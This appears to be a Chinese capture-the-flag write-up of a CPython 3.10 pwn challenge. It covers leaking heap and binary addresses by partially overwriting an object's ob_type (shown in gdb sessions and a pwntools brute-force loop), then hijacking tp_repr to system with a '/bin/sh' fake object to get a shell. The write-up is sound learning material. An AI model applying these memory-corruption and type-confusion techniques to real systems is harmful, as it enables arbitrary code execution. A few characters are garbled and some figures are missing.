./pwnid(a):0x748081611640id(a[0]):0x7480815a5d40id(a[1]):0x7480816c8070id(a[2]):0x7480815f06c0id(a[3]):0x7480816cc030id(a[4]):0x748081564cb0id(a)-id(a[0]):0x6b900id(a)-id(a[1]):-0xb6a30id(a)-id(a[2]):0x20f80id(a)-id(a[3]):-0xba9f0id(a)-id(a[4]):0xac990&gt; ^CTraceback (most recent call last):  File &quot;/home/ctf/chal/./pwn&quot;, line 19, in &lt;module&gt;    inp = input(&quot;&gt; &quot;)KeyboardInterruptroot@34fe368f500a:/home/ctf/chal# ./pwnid(a):0x7d40a52116c0id(a[0]):0x7d40a51a5d00id(a[1]):0x7d40a52cc070id(a[2]):0x7d40a51f0780id(a[3]):0x7d40a52d0030id(a[4]):0x7d40a5164cb0id(a)-id(a[0]):0x6b9c0id(a)-id(a[1]):-0xba9b0id(a)-id(a[2]):0x20f40id(a)-id(a[3]):-0xbe970id(a)-id(a[4]):0xaca10&gt; ^CTraceback (most recent call last):  File &quot;/home/ctf/chal/./pwn&quot;, line 19, in &lt;module&gt;    inp = input(&quot;&gt; &quot;)KeyboardInterruptroot@34fe368f500a:/home/ctf/chal# ./pwnid(a):0x7329ef6b9640id(a[0]):0x7329ef64dd40id(a[1]):0x7329ef770070id(a[2]):0x7329ef6986c0id(a[3]):0x7329ef774030id(a[4]):0x7329ef60ccb0id(a)-id(a[0]):0x6b900id(a)-id(a[1]):-0xb6a30id(a)-id(a[2]):0x20f80id(a)-id(a[3]):-0xba9f0id(a)-id(a[4]):0xac990\n\n因此，为方便学习，我们在原 rw.py 程序中固定输出 id(a)-id(a[0]) 的值，假定该值恒定；同时为了调试方便，输出 id(a) 的值，当然，该值只用于调试索引，仍需要进行显式的地址泄露：\npwndbg&gt; p *(PyObject*)0x75461e1f3b60$1 = &#123;  ob_refcnt = 1,  ob_type = 0x5f1b112b57c0 &lt;PyList_Type&gt;&#125;pwndbg&gt; p *(PyListObject*)0x75461e1f3b60$2 = &#123;  ob_base = &#123;    ob_base = &#123;      ob_refcnt = 1,      ob_type = 0x5f1b112b57c0 &lt;PyList_Type&gt;    &#125;,    ob_size = 5  &#125;,  ob_item = 0x75461e1d1c80,  allocated = 5&#125;pwndbg&gt; p *(PyObject*)(0x75461e1f3b60-0x75bf0)$3 = &#123;  ob_refcnt = 1,  ob_type = 0x5f1b112b7820 &lt;PyDict_Type&gt;&#125;pwndbg&gt; \n\n现在我们可以做到稳定的修改 a[0] 的相关结构体成员。\n我们知道 print 函数实际上是 builtin_print 基于对象 ob_type 相关信息输出内容的，让我们再次回顾一下 print 函数打印对象时的相关过程：\n// print(obj) -&gt; builtin_print -&gt; PyFile_WriteObject -&gt; PyObject_Repr -&gt; PyObject_Repr(PyObject *v)&#123;\t...    if (v == NULL)        return PyUnicode_FromString(&quot;&lt;NULL&gt;&quot;);    if (Py_TYPE(v)-&gt;tp_repr == NULL)        return PyUnicode_FromFormat(&quot;&lt;%s object at %p&gt;&quot;,                                    Py_TYPE(v)-&gt;tp_name, v);    ...&#125;\n\n当 ob_type-&gt;tp_repr==NULL 时，将打印对象的地址——这就给我们造成了泄露的机会。然而，我们只能在没有地址信息的情况下修改 a[0] 对象的 ob_type，而无法直接修改 ob_type-&gt;tp_repr——是否可以通过写 ob_type，使得 tp_repr 域对应的内存为 NULL 呢？或许在调用链过程中会做一些检查，使得调用中断，但是我们可以一试！\n让我们先用 gdb 调试一下，手动覆写为 NULL，验证泄露的可行性：\npwndbg&gt; b builtin_printBreakpoint 1 at 0x62726ab4c7ea: file Python/bltinmodule.c, line 1949.pwndbg&gt; p *(PyObject*)0x7f99585f7b60$1 = &#123;  ob_refcnt = 1,  ob_type = 0x62726ad077c0 &lt;PyList_Type&gt;&#125;pwndbg&gt; p *(PyListObject*)(0x7f99585f7b60)$2 = &#123;  ob_base = &#123;    ob_base = &#123;      ob_refcnt = 1,      ob_type = 0x62726ad077c0 &lt;PyList_Type&gt;    &#125;,    ob_size = 5  &#125;,  ob_item = 0x7f99585d5c80,  allocated = 5&#125;pwndbg&gt; p *(PyDictObject*)(0x7f99585f7b60-0x75bf0)$3 = &#123;  ob_base = &#123;    ob_refcnt = 1,    ob_type = 0x62726ad09820 &lt;PyDict_Type&gt;  &#125;,  ma_used = 0,  ma_version_tag = 14975,  ma_keys = 0x62726ad08940 &lt;empty_keys_struct&gt;,  ma_values = 0x62726ad30578 &lt;empty_values&gt;&#125;pwndbg&gt; set (PyTypeObject*)0x62726ad09820-&gt;tp_new_tp_new_methoddef  tp_new_wrapper    pwndbg&gt; set ((PyTypeObject*)0x62726ad09820)-&gt;tp_repr = 0pwndbg&gt; p ((PyTypeObject*)0x62726ad09820)-&gt;tp_repr$4 = (reprfunc) 0x0pwndbg&gt; cContinuing.--------------------&gt; $ r 0[DEBUG] Sent 0x4 bytes:    b&#x27;r 0\\n&#x27;[DEBUG] Received 0x22 bytes:    b&#x27;&lt;dict object at 0x7f9958581f70&gt;\\n&#x27;    b&#x27;&gt; &#x27;&lt;dict object at 0x7f9958581f70&gt;\n\n可行！现在我们用 gdb 覆盖 a[0] 对象 ob_type 指针的最低一字节为 \\x00：\npwndbg&gt; p *(PyObject*)0x74ee817f7a20$1 = &#123;  ob_refcnt = 1,  ob_type = 0x5dce4facc7c0 &lt;PyList_Type&gt;&#125;pwndbg&gt; p *(PyObject*)(0x74ee817f7a20-0x75a50)$2 = &#123;  ob_refcnt = 1,  ob_type = 0x5dce4face820 &lt;PyDict_Type&gt;&#125;pwndbg&gt; set ((PyObject*)(0x74ee817f7a20-0x75a50))-&gt;ob_type = 0x5dce4face800pwndbg&gt; p *(PyObject*)(0x74ee817f7a20-0x75a50)$3 = &#123;  ob_refcnt = 1,  ob_type = 0x5dce4face800 &lt;PyDictIterKey_Type+384&gt;&#125;pwndbg&gt; cContinuing.Program received signal SIGSEGV, Segmentation fault.\n\n崩了，我们更改偏移试一试，写个循环爆一爆\nfrom pwn import *# context(log_level = &quot;debug&quot;)for i in range(0, 0xff, 0x8):    io = process([&quot;python3&quot;,&quot;rw.py&quot;])    io.recvuntil(b&quot;id(a):0x&quot;)    a_addr = int(io.recvline().strip(), 16)    io.recvuntil(b&quot;id(a)-id(a[0]):0x&quot;)    a0_addr = a_addr - int(io.recvline().strip(), 16)    success(f&quot;a_addr: &#123;hex(a_addr)&#125;&quot;)    success(f&quot;a0_addr: &#123;hex(a0_addr)&#125;&quot;)    gdb.attach(io,f&quot;set *(char*)(&amp;(((PyObject*)(&#123;hex(a0_addr)&#125;))-&gt;ob_type)) = &#123;hex(i)&#125;\\nc&quot;)    print(hex(i))    io.sendlineafter(b&quot;&gt; &quot;, b&quot;r 0&quot;)    io.interactive()    io.close()--------------------[+] Waiting for debugger: Done0x58[*] Switching to interactive modeFatal Python error: _Py_CheckFunctionResult: a function returned NULL without setting an exceptionPython runtime state: initializedSystemError: &lt;built-in function print&gt; returned NULL without setting an exceptionCurrent thread 0x00007c7a90b01740 (most recent call first):  File &quot;/.../rw.py&quot;, line 24 in &lt;module&gt;$ [*] Interrupted[*] Stopped process &#x27;/.../python3&#x27; (pid 13342)[+] Starting local process &#x27;/*/python-3.10.12-install/bin/python3&#x27;: pid 13487[+] a_addr: 0x71e6295f3b60[+] a0_addr: 0x71e62957df70[*] running in new terminal: [&#x27;/usr/bin/gdb&#x27;, &#x27;-q&#x27;, &#x27;/.../python3&#x27;, &#x27;13487&#x27;, &#x27;-x&#x27;, &#x27;/tmp/pwnlib-gdbscript-ls7j54_1.gdb&#x27;][+] Waiting for debugger: Done0x60[*] Switching to interactive mode[*] Got EOF while reading in interactive$ [*] Interrupted[*] Process &#x27;/.../python3&#x27; stopped with exit code -11 (SIGSEGV) (pid 13487)[+] Starting local process &#x27;/.../python3&#x27;: pid 13653[+] a_addr: 0x7bf8da1f3a20[+] a0_addr: 0x7bf8da17dfd0[*] running in new terminal: [&#x27;/usr/bin/gdb&#x27;, &#x27;-q&#x27;, &#x27;/.../python3&#x27;, &#x27;13653&#x27;, &#x27;-x&#x27;, &#x27;/tmp/pwnlib-gdbscript-lyd8w3za.gdb&#x27;][+] Waiting for debugger: Done0x68[*] Switching to interactive mode&lt; object at 0x7bf8da17dfd0&gt;&gt; $  \n\n在 0x68 的时候成功泄露出对象的地址信息，经测试，对于 本题目，在 我使用的环境下，0x68 能够稳定 leak 而不崩溃。\n\n经过比较，0x68 相对于原有的新增偏移 0x48\n进一步我对()、[]、”” 也做了测试：\n\n对于元组()对象的 ob_type 偏移粗略遍历没有泄露，不过我遍历的范围有限\n某偏移使得列表 [] 对象也能泄露\n\n\n\n\n对于字符串 “” 对象，某偏移会报错同时重复输出地址，对于程序每次运行时偏移不变的相关题目有所帮助：\n\n\n\n基于上述信息：利用部分覆写 ob_type 造成结构体偏移从而 leak 的方法是较为通用的，具体的偏移值还是在具体的题目中调试为妙\n\nok，探索就先到这里，我们继续做题：现在已经 leak 出对象在程序中的地址，这是一个 堆地址。接下来尝试泄露程序基址。\na 对象是一个列表，让我们回顾一下列表对象 PyListObject 的构成：\ntypedef struct &#123;    PyVarObject ob_base; // 包含 PyObject 和 ob_size    PyObject **ob_item;   // 指向列表元素指针数组的指针    Py_ssize_t allocated; // 列表实际分配的内存空间&#125; PyListObject;---------------------------------------------pwndbg&gt; p *(PyListObject*)0x78763a5f35c0$1 = &#123;  ob_base = &#123;    ob_base = &#123;      ob_refcnt = 1,      ob_type = 0x643bfa5117c0 &lt;PyList_Type&gt;    &#125;,    ob_size = 5  &#125;,  ob_item = 0x78763a5dde00,  allocated = 5&#125;pwndbg&gt; p ob_itemNo symbol &quot;ob_item&quot; in current context.pwndbg&gt; tele 0x78763a5dde0000:0000│  0x78763a5dde00 —▸ 0x78763a57deb0 ◂— 101:0008│  0x78763a5dde08 —▸ 0x78763a890250 ◂— 0x58a02:0010│  0x78763a5dde10 —▸ 0x78763a5ce850 ◂— 103:0018│  0x78763a5dde18 —▸ 0x78763a894040 ◂— 0x3f /* &#x27;?&#x27; */04:0020│  0x78763a5dde20 —▸ 0x78763a9205b0 ◂— 305:0028│  0x78763a5dde28 ◂— 0xfdfdfdfdfdfdfdfd06:0030│  0x78763a5dde30 ◂— 0x220000000000000007:0038│  0x78763a5dde38 ◂— 0xfdfdfdfdfdfdfd6f\n\n在 print(a[idx]) 的时候，首先依据下标从 ob_item 找到对应打印的元素，然后执行后续的打印操作。ob_item 也是一个指向堆地址的指针，而此时我们已经泄露出堆地址，因此我们是否可以修改 a 对象的 ob_item 来实现泄露呢？可以一试——但是改为什么值呢。\nPython 高级语言的一个重要的特性是：一切都是对象——这为潜在的类型混淆攻击提供了便利。\n我们注意到，所有对象类都继承自 PyObject，包括 类型对象——全局对象，存储在 BSS 段\n对于 a=[&#123;&#125;,(),[],&quot;&quot;,0.0]，a[0] 类型为字典，其 ob_type 指针指向 字典对象 TypeDict_Type，经过调试可以鲜明看到这种关系：\n\n\npwndbg&gt; p PyDict_Type $3 = &#123;抽吃随的  ob_base = &#123;    ob_base = &#123;      ob_refcnt = 42,      ob_type = 0x630342dcbec0 &lt;PyType_Type&gt;    &#125;,    ob_size = 0  &#125;,  tp_name = 0x630342c7e7a6 &quot;dict&quot;,  tp_basicsize = 48,  tp_itemsize = 0,  tp_dealloc = 0x630342a6a686 &lt;dict_dealloc&gt;,  tp_vectorcall_offset = 0,  tp_getattr = 0x0,  tp_setattr = 0x0,  tp_as_async = 0x0,  tp_repr = 0x630342a6d9ea &lt;dict_repr&gt;,  tp_as_number = 0x630342dc47a0 &lt;dict_as_number&gt;,  tp_as_sequence = 0x630342dc48c0 &lt;dict_as_sequence&gt;,  tp_as_mapping = 0x630342dc4910 &lt;dict_as_mapping&gt;,  tp_hash = 0x630342a782b9 &lt;PyObject_HashNotImplemented&gt;,  tp_call = 0x0,  tp_str = 0x630342a8c12b &lt;object_str&gt;,  tp_getattro = 0x630342a7c0ef &lt;PyObject_GenericGetAttr&gt;,  tp_setattro = 0x630342a7c564 &lt;PyObject_GenericSetAttr&gt;,  tp_as_buffer = 0x0,  tp_flags = 541611328,  tp_doc = 0x630342cc7fe0 &lt;dictionary_doc&gt; &quot;dict() -&gt; new empty dictionary\\ndict(mapping) -&gt; new dictionary initialized from a mapping object&#x27;s\\n    (key, value) pairs\\ndict(iterable) -&gt; new dictionary initialized as if via:\\n    d = &#123;&#125;\\n    for k, &quot;...,  tp_traverse = 0x630342a674c6 &lt;dict_traverse&gt;,  tp_clear = 0x630342a6d75c &lt;dict_tp_clear&gt;,  tp_richcompare = 0x630342a69134 &lt;dict_richcompare&gt;,  tp_weaklistoffset = 0,  tp_iter = 0x630342a698d9 &lt;dict_iter&gt;,  tp_iternext = 0x0,  tp_methods = 0x630342dc59c0 &lt;mapp_methods&gt;,  tp_members = 0x0,  tp_getset = 0x0,  tp_base = 0x630342dcbd20 &lt;PyBaseObject_Type&gt;,  tp_dict = 0x7eb1b6ad0ef0,  tp_descr_get = 0x0,  tp_descr_set = 0x0,  tp_dictoffset = 0,  tp_init = 0x630342a6fba2 &lt;dict_init&gt;,  tp_alloc = 0x630342a8fa82 &lt;PyType_GenericAlloc&gt;,  tp_new = 0x630342a6c40e &lt;dict_new&gt;,  tp_free = 0x630342b4d610 &lt;PyObject_GC_Del&gt;,  tp_is_gc = 0x0,  tp_bases = 0x7eb1b6a9adf0,  tp_mro = 0x7eb1b6a9ae40,  tp_cache = 0x0,  tp_subclasses = 0x7eb1b6ae7b30,  tp_weaklist = 0x7eb1b6ad1c70,  tp_del = 0x0,  tp_version_tag = 11,  tp_finalize = 0x0,  tp_vectorcall = 0x630342a6f95f &lt;dict_vectorcall&gt;&#125;\n可以看到，tp_dict 字段是一个堆地址，他和python中dict对象的__dict__方法有关系吗？瞅瞅源码\n//------------------------------------------// Objects/dictobject.c//------------------------------------------PyDoc_STRVAR(dictionary_doc,&quot;dict() -&gt; new empty dictionary\\n&quot;&quot;dict(mapping) -&gt; new dictionary initialized from a mapping object&#x27;s\\n&quot;&quot;    (key, value) pairs\\n&quot;&quot;dict(iterable) -&gt; new dictionary initialized as if via:\\n&quot;&quot;    d = &#123;&#125;\\n&quot;&quot;    for k, v in iterable:\\n&quot;&quot;        d[k] = v\\n&quot;&quot;dict(**kwargs) -&gt; new dictionary initialized with the name=value pairs\\n&quot;&quot;    in the keyword argument list.  For example:  dict(one=1, two=2)&quot;);PyTypeObject PyDict_Type = &#123;    PyVarObject_HEAD_INIT(&amp;PyType_Type, 0)    &quot;dict&quot;,    sizeof(PyDictObject),    0,    (destructor)dict_dealloc,                   /* tp_dealloc */    0,                                          /* tp_vectorcall_offset */    0,                                          /* tp_getattr */    0,                                          /* tp_setattr */    0,                                          /* tp_as_async */    (reprfunc)dict_repr,                        /* tp_repr */    &amp;dict_as_number,                            /* tp_as_number */    &amp;dict_as_sequence,                          /* tp_as_sequence */    &amp;dict_as_mapping,                           /* tp_as_mapping */    PyObject_HashNotImplemented,                /* tp_hash */    0,                                          /* tp_call */    0,                                          /* tp_str */    PyObject_GenericGetAttr,                    /* tp_getattro */    0,                                          /* tp_setattro */    0,                                          /* tp_as_buffer */    Py_TPFLAGS_DEFAULT | Py_TPFLAGS_HAVE_GC |        Py_TPFLAGS_BASETYPE | Py_TPFLAGS_DICT_SUBCLASS |        _Py_TPFLAGS_MATCH_SELF | Py_TPFLAGS_MAPPING,  /* tp_flags */    dictionary_doc,                             /* tp_doc */    dict_traverse,                              /* tp_traverse */    dict_tp_clear,                              /* tp_clear */    dict_richcompare,                           /* tp_richcompare */    0,                                          /* tp_weaklistoffset */    (getiterfunc)dict_iter,                     /* tp_iter */    0,                                          /* tp_iternext */    mapp_methods,                               /* tp_methods */    0,                                          /* tp_members */    0,                                          /* tp_getset */    0,                                          /* tp_base */    0,                                          /* tp_dict */    0,                                          /* tp_descr_get */    0,                                          /* tp_descr_set */    0,                                          /* tp_dictoffset */    dict_init,                                  /* tp_init */    PyType_GenericAlloc,                        /* tp_alloc */    dict_new,                                   /* tp_new */    PyObject_GC_Del,                            /* tp_free */    .tp_vectorcall = dict_vectorcall,&#125;;//------------------------------------------// Include/cpython/object.h//------------------------------------------/* PyTypeObject structure is defined in cpython/object.h.   In Py_LIMITED_API, PyTypeObject is an opaque structure. */typedef struct _typeobject PyTypeObject;//------------------------------------------// Include/cpython/object.h//------------------------------------------typedef struct _typeobject &#123;    PyObject_VAR_HEAD    const char *tp_name; /* For printing, in format &quot;&lt;module&gt;.&lt;name&gt;&quot; */    Py_ssize_t tp_basicsize, tp_itemsize; /* For allocation */    /* Methods to implement standard operations */    destructor tp_dealloc;    Py_ssize_t tp_vectorcall_offset;    getattrfunc tp_getattr;    setattrfunc tp_setattr;    PyAsyncMethods *tp_as_async; /* formerly known as tp_compare (Python 2)                                    or tp_reserved (Python 3) */    reprfunc tp_repr;    /* Method suites for standard classes */    PyNumberMethods *tp_as_number;    PySequenceMethods *tp_as_sequence;    PyMappingMethods *tp_as_mapping;    /* More standard operations (here for binary compatibility) */    hashfunc tp_hash;    ternaryfunc tp_call;    reprfunc tp_str;    getattrofunc tp_getattro;    setattrofunc tp_setattro;    /* Functions to access object as input/output buffer */    PyBufferProcs *tp_as_buffer;    /* Flags to define presence of optional/expanded features */    unsigned long tp_flags;    const char *tp_doc; /* Documentation string */    /* Assigned meaning in release 2.0 */    /* call function for all accessible objects */    traverseproc tp_traverse;    /* delete references to contained objects */    inquiry tp_clear;    /* Assigned meaning in release 2.1 */    /* rich comparisons */    richcmpfunc tp_richcompare;    /* weak reference enabler */    Py_ssize_t tp_weaklistoffset;    /* Iterators */    getiterfunc tp_iter;    iternextfunc tp_iternext;    /* Attribute descriptor and subclassing stuff */    struct PyMethodDef *tp_methods;    struct PyMemberDef *tp_members;    struct PyGetSetDef *tp_getset;    // Strong reference on a heap type, borrowed reference on a static type    struct _typeobject *tp_base;    PyObject *tp_dict;    descrgetfunc tp_descr_get;    descrsetfunc tp_descr_set;    Py_ssize_t tp_dictoffset;    initproc tp_init;    allocfunc tp_alloc;    newfunc tp_new;    freefunc tp_free; /* Low-level free-memory routine */    inquiry tp_is_gc; /* For PyObject_IS_GC */    PyObject *tp_bases;    PyObject *tp_mro; /* method resolution order */    PyObject *tp_cache;    PyObject *tp_subclasses;    PyObject *tp_weaklist;    destructor tp_del;    /* Type attribute cache version tag. Added in version 2.6 */    unsigned int tp_version_tag;    destructor tp_finalize;    vectorcallfunc tp_vectorcall;&#125; PyTypeObject;\n\n通过在项目中搜索字符串，找到了tp_dict的相关解释：\n//Objects/typeobject.c/* This function is called by PyType_Ready() to populate the type&#x27;s   dictionary with method descriptors for function slots.  For each   function slot (like tp_repr) that&#x27;s defined in the type, one or more   corresponding descriptors are added in the type&#x27;s tp_dict dictionary   under the appropriate name (like __repr__).  Some function slots   cause more than one descriptor to be added (for example, the nb_add   slot adds both __add__ and __radd__ descriptors) and some function   slots compete for the same descriptor (for example both sq_item and   mp_subscript generate a __getitem__ descriptor).      ...*/static intadd_operators(PyTypeObject *type)&#123;    PyObject *dict = type-&gt;tp_dict;\t...&#125;\n\n翻译：这个函数被 PyType_Ready()调用，用于将函数槽位的方法描述符填充到类型的字典中。对于类型中定义的每个函数槽位（如 tp_repr），一个或多个对应的描述符会被添加到类型的 tp_dict字典中，使用适当的名称（如 __repr__）。有些函数槽位会导致添加多个描述符（例如，nb_add槽位会同时添加 __add__和 __radd__描述符），而有些函数槽位会竞争同一个描述符（例如 sq_item和 mp_subscript都会生成 __getitem__描述符）。\n它解释了 tp_dict字段的一个关键作用：作为 Python 类在语言层面的属性和方法描述符的容器\n接下来，让我们回到题目：如何泄露程序基址——通过修改列表a的ob_item指针，从而使得[&#123;&#125;,(),&#123;&#125;,&quot;&quot;,0.0] -&gt; [dict.__dict__]，这样print(a[0])时就可以print(dict.__dict__)！现在让我们看看该如何布局：\n\n\n因此可知：\n\n\n爽读下源码：\n#ifndef Py_CPYTHON_LISTOBJECT_H#  error &quot;this header file must not be included directly&quot;#endiftypedef struct &#123;    PyObject_VAR_HEAD    /* Vector of pointers to list elements.  list[0] is ob_item[0], etc. */    PyObject **ob_item;    /* ob_item contains space for &#x27;allocated&#x27; elements.  The number     * currently in use is ob_size.     * Invariants:     *     0 &lt;= ob_size &lt;= allocated     *     len(list) == ob_size     *     ob_item == NULL implies ob_size == allocated == 0     * list.sort() temporarily sets allocated to -1 to detect mutations.     *     * Items must normally not be NULL, except during construction when     * the list is not yet visible outside the function that builds it.     */    Py_ssize_t allocated;&#125; PyListObject;PyAPI_FUNC(PyObject *) _PyList_Extend(PyListObject *, PyObject *);PyAPI_FUNC(void) _PyList_DebugMallocStats(FILE *out);/* Macro, trading safety for speed *//* Cast argument to PyListObject* type. */#define _PyList_CAST(op) (assert(PyList_Check(op)), (PyListObject *)(op))#define PyList_GET_ITEM(op, i) (_PyList_CAST(op)-&gt;ob_item[i])#define PyList_SET_ITEM(op, i, v) ((void)(_PyList_CAST(op)-&gt;ob_item[i] = (v)))#define PyList_GET_SIZE(op)    Py_SIZE(_PyList_CAST(op))\n\n原来ob_item是个指针数组，调试也确实如此\n\n\n找一个存放__dict__指针的地址，这里选择PyDict_Type对象\n\n\n 所以只要将ob_item指向的区域，写上PyDict_Type.__dict__，即将a变成：[PyDict_Type.__dict__,(),[],&quot;&quot;,0.0]，此时再print(a[0])，即可print(PyDict_Type.__dict__)，泄露elf基址。经GDB调试验证，可行。\n\n\n然而，一个有趣的现象发生了：\na = [&#123;&#125;, (), [], &quot;&quot;, 0.0]dicttype = dictprint(&quot;id(dict.__dict__):&quot;+hex(id(dicttype.__dict__)))print(&quot;id(a[0]):&quot;+hex(id(a[0])))print(&quot;id(dicttype.__dict__):&quot;+hex(id(dicttype.__dict__)))print(&quot;id(a[1]):&quot;+hex(id(a[1])))print(&quot;id(dicttype.__dict__):&quot;+hex(id(dicttype.__dict__)))print(&quot;id(a[2]):&quot;+hex(id(a[2])))print(&quot;id(dicttype.__dict__):&quot;+hex(id(dicttype.__dict__)))print(&quot;id(a):&quot;+hex(id(a)))print(&quot;id(a)-id(dicttype.__dict__):&quot;+hex(id(a)-id(dicttype.__dict__)))print(&quot;id(a[3]):&quot;+hex(id(a[3])))print(&quot;id(a[4]):&quot;+hex(id(a[4])))print(&quot;id(dicttype.__dict__):&quot;+hex(id(dicttype.__dict__)))print(&quot;id(a)-id(a[0]):&quot;+hex(id(a)-id(a[0])))print(&quot;id(a)-id(dicttype.__dict__):&quot;+hex(id(a)-id(dicttype.__dict__)))\n\n输出：\nb&#x27;id(dict.__dict__):0x77a3c75de290\\n&#x27;b&#x27;id(a[0]):0x77a3c757dfd0\\n&#x27;b&#x27;id(dicttype.__dict__):0x77a3c75de290\\n&#x27;b&#x27;id(a[1]):0x77a3c78f8250\\n&#x27;b&#x27;id(dicttype.__dict__):0x77a3c75de350\\n&#x27;b&#x27;id(a[2]):0x77a3c75ce940\\n&#x27;b&#x27;id(dicttype.__dict__):0x77a3c75de290\\n&#x27;b&#x27;id(a):0x77a3c75e4fa0\\n&#x27;b&#x27;id(a)-id(dicttype.__dict__):0x6d10\\n&#x27;b&#x27;id(a[3]):0x77a3c78fc040\\n&#x27;b&#x27;id(a[4]):0x77a3c79885b0\\n&#x27;b&#x27;id(dicttype.__dict__):0x77a3c75de290\\n&#x27;b&#x27;id(a)-id(a[0]):0x66fd0\\n&#x27;b&#x27;id(a)-id(dicttype.__dict__):0x6c50\\n&#x27;b&#x27;\\n&#x27;b&#x27;&gt; &#x27;\n\ndicttype.__dict__的地址不是固定的——据大模型解释，这是因为：\n\n字典是可变对象，任何对 dict 类的修改都会导致 __dict__ 变化\n字典存在内部优化机制，会根据使用情况重新分配内存、切换table\n每次id(...)访问，都可能造成对象内部实现的变化\n\n这种现象对于tuple等对象也存在，可能只有在特定的环境上，才能像官方的wp中固定offset也能比较稳定的利用吧。\n——假定我们顺利泄露了heap base &amp; elf base（抱着学习的态度，不钻牛角尖）\n接下来的利用再次佐证了fakeobj.py教我们的手法：构造fakeobject，劫持函数指针_repr_，在调用builtin_print时劫持执行流：\n...# craft a fake PyTypeObject with tp_repr set to libc.systemwrite_abs(addr_of_a + SCRATCH_FAKE_PyTypeObject_OFFSET + 88, p64(libc_base + LIBC_SYSTEM_OFFSET)) # tp_repr is at offset 88# set the ob_refcnt field to &quot;.bin/sh&quot; the &#x27;.&#x27; turns into &#x27;/&#x27; after refcnt incwrite_abs(addr_of_a + SCRATCH_FAKE_PyObject_OFFSET, b&#x27;.bin/sh\\x00&#x27;)# craft the fake PyObject with ob_type set to the fake PyTypeObjectwrite_abs(addr_of_a + SCRATCH_FAKE_PyObject_OFFSET + 8, p64(addr_of_a + SCRATCH_FAKE_PyTypeObject_OFFSET))# shellread(0)...\n\n五、小结\n构造fakeobj，劫持_repr_为system，对象头部覆写.bin/sh，print(fakeobj)时劫持到system(&#39;/bin/sh\\x00&#39;)\n当 tp_repr 为空，在满足一些判断条件的情况下，会打印对象所在位置——将该字段置空可泄露地址——可以通过遍历ob_type = ob_type + offset的方式尝试\npython中一切皆对象，通过指针篡改，可以利用类型混淆，实现泄露等目的\n列表、元组对象的ob_item可以尝试劫持；字典对象的ma_keys和ma_values可以尝试劫持；\n\n"}]